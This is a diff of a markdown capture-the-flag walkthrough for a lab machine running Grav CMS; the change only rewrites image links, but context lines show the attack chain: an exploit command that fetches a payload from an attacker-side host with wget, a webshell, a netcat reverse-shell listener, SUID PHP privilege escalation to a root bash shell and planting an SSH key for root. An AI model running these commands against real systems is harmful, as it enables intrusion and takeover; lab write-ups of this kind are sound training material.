@@ -58,13 +58,13 @@ nmap -vv -T5 -p22,80 -sC -sV 192.168.x.x
 
 **Step 1:** Accessing the index page reveals directory indexing is enabled
 
-![[Pasted image 20251029154304.png]]
+![Pasted image 20251029154304.png](/assets/images/2025-10-29-Astronaut/Pasted image 20251029154304.png)
 
 All content appears to be under the `grav-admin` directory.
 
 **Step 2:** Navigating to the Grav admin directory confirms this is a **Grav CMS** installation
 
-![[Pasted image 20251029154333.png]]
+![Pasted image 20251029154333.png](/assets/images/2025-10-29-Astronaut/Pasted image 20251029154333.png)
 
 <div class="divider divider-info">
     <span class="divider-title">Grav CMS</span>
@@ -123,7 +123,7 @@ python3 exploit.py -t http://192.168.x.x/grav-admin -c "wget http://10.10.14.5:8
 
 Navigate to `http://192.168.x.x/shell.php`
 
-![[Pasted image 20251029154801.png]]
+![Pasted image 20251029154801.png](/assets/images/2025-10-29-Astronaut/Pasted image 20251029154801.png)
 
 <div class="divider divider-root">
     <span class="divider-title">Webshell Access</span>
@@ -144,7 +144,7 @@ nc -lvnp 4444
 # Trigger reverse shell by accessing revshell.php
 ```
 
-![[Pasted image 20251029154920.png]]
+![Pasted image 20251029154920.png](/assets/images/2025-10-29-Astronaut/Pasted image 20251029154920.png)
 
 <div class="divider divider-root">
     <span class="divider-title">Shell Access</span>
@@ -180,7 +180,7 @@ chmod +x linpeas.sh
 
 **Critical finding:** SUID binaries
 
-![[Pasted image 20251029155217.png]]
+![Pasted image 20251029155217.png](/assets/images/2025-10-29-Astronaut/Pasted image 20251029155217.png)
 
 <div class="divider divider-warning">
     <span class="divider-title">SUID PHP Binary</span>
@@ -193,7 +193,7 @@ chmod +x linpeas.sh
 
 **Step 3:** Check GTFOBins for PHP SUID exploitation
 
-![[Pasted image 20251029155330.png]]
+![Pasted image 20251029155330.png](/assets/images/2025-10-29-Astronaut/Pasted image 20251029155330.png)
 
 GTFOBins shows PHP can spawn privileged shells when SUID is set.
 
@@ -211,7 +211,7 @@ Modified to use bash instead:
 /usr/bin/php7.4 -r "pcntl_exec('/bin/bash', ['-p']);"
 ```
 
-![[Pasted image 20251029155524.png]]
+![Pasted image 20251029155524.png](/assets/images/2025-10-29-Astronaut/Pasted image 20251029155524.png)
 
 <div class="divider divider-root">
     <span class="divider-title">Privileged Shell</span>
@@ -235,7 +235,7 @@ chmod 600 /root/.ssh/authorized_keys
 chmod 700 /root/.ssh
 ```
 
-![[Pasted image 20251029155721.png]]
+![Pasted image 20251029155721.png](/assets/images/2025-10-29-Astronaut/Pasted image 20251029155721.png)
 
 **Step 6:** SSH as root
 ```bash
